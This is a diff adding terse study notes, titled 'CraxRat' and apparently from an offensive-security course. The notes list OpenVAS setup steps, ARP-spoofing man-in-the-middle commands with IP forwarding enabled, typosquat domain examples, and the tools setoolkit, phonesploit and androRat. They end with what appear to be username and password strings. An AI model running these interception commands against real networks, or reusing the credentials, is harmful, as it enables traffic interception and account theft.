@@ -1,0 +1,52 @@
+# CraxRat
+# OpenVAS -----> DYNAMIC REPORTS
+	- sudo apt update
+	- sudo apt install openvas
+	- sudo gvm-setup
+	[shutdown + snapshot]
+
+	- sudo gvm-check-setup
+	- old version 2022
+================
+# Reporting التقارير
+	# Dynamic
+	# Static
+=================
+# Man in the middle
+	# sudo apt update
+	# sudo apt install dsniff
+
+	# sudo arpspoof -i eth0 -t 192.168.2.6 192.168.2.1
+	# sudo arpspoof -i eth0 -t 192.168.2.1 192.168.2.6
+
+	# sudo su
+	# cat /proc/sys/net/ipv4/ip_forward
+	# echo 1 > /proc/sys/net/ipv4/ip_forward
+
+	# wireshark
+
+	# bettercap
+
+	# http ==> plain text
+	# https ==> Secure
+	# hsts
+
+https://www.google.com   ==> http://www.gogle.com
+https://www.facebook.com ==> http://www.facebok.com ==> www.facebook.corn
+=================
+# Socail Enginnering
+	# setoolkit
+=================
+# Mobile Devices
+	# phonesploit
+	# androRat
+	# Analsis
+=================
+ahmed 123456
+
+username and/or password is not correct.
+username and/or password is not correct
+
+password is not correct
+
+aH20MeD@25
